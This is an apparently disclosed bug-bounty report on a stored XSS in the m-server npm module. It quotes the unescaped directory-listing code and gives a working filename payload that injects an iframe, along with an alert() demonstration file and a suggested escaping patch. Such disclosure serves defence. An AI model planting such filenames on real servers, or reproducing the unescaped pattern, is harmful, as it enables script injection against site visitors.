# [m-server] HTML Injection in filenames displayed as directory listing in the browser allows to embed iframe with malicious JavaScript code

## Report Details
- **Report ID**: 319794
- **URL**: https://hackerone.com/reports/319794
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-02-26T14:11:20.512Z
- **Disclosed**: 2018-07-12T08:41:30.324Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Stored XSS vulnerability in ```m-server``` module.
```m-server``` displays content of selected directory as HTML in the browser. However, no escape is implemented which allows malicious user to embed executable JavaScript or HTML code (eg. to load HTML document into ```iframe``` element and execute JavaScript from within loaded file).

## Module

**module name:** m-server
**version:** 1.4.0
**npm page:** https://www.npmjs.com/package/m-server

### Module Description

M-Server is a mini http static server that without any dependencies;

### Module Stats

Stats
6 downloads in the last day
68 downloads in the last week
180 downloads in the last month

~2200 estimated downloads per year

## Vulnerability Description

No HTML special characters escape is implememtned in the function which constructs and returns HTML with current directory listing:


```javascript
// node_modules/m-server/lib/utils.js, line 57

    dirs.sort(sort).forEach(function (val) {
        html.push('<li><a href="' + path + '/' + val + '">' + val + '</a></li>');
    });
    files.sort(sort).forEach(function (val) {
        html.push('<li><a download href="' + path + '/' + val + '">' + val + '</a></li>');
    });
    html.push('</ul>');
    return html.join('');
```


## Steps To Reproduce:

- install ```m-server``` module:

```
$ npm install m-server
```

- create ```malware_frame.html``` file with following content:

```html
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script>
        alert('Uh oh, I am bad, bad malware!!!')
    </script>
</body>

</html>
```

- in the same directory, create another file with following name:

```
"><iframe src="malware_frame.html">
```

- run ```m-server``` in the same directory, where two above files exist:

```
$ ./node_modules/m-server/index.js -p 8080
-------------------------------------------------------------
	Mini http server running on port 8080 !
	You can open the floowing urls to view files.
	127.0.0.1:8080
	10.235.1.22:8080
	10.235.4.26:8080
	Have fun ^_^
-------------------------------------------------------------

```

- malicious frame is embedded and JavaScript code from ```malware_frame.html``` executed immediately:

{F267014}


Both files can be uploaded by malicious user if eg. other vunerabilities in other applications exist on the same server (eg. upload file feature) or if attacker gains an access to the server using poorly secured remote access.


## Patch

```escape-html``` module can be used to prevent this attack (https://www.npmjs.com/package/escape-html):

```javascript
const escapeHtml = require('escape-html')

(...)

// vulnerable part of node_modules/m-server/lib/utils.js:
dirs.sort(sort).forEach(function (val) {
    html.push('<li><a href="' + path + '/' + escape(val) + '">' + escape(val) + '</a></li>');
});
files.sort(sort).forEach(function (val) {
    html.push('<li><a download href="' + path + '/' + escape(val) + '">' + escape(val) + '</a></li>');
});
html.push('</ul>');
return html.join('');

```

## Supporting Material/References:

- Operating system: Ubuntu 16.04
- Node.js 8.9.4
- npm v. 5.6.0
- curl 7.47.0

## Wrap up

- I contacted the maintainer to let him know: [N] 
- I opened an issue in the related repository: [N] 


Regards,

Rafal 'bl4de' Janicki

## Impact

Malicious user is able to inject iframe element with malicious JavaScript code via crafted filename when directory listing is displayed in the browser

The hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
http://localhost:8080

**Verified**
Yes



## Attachments
- 1.jpg
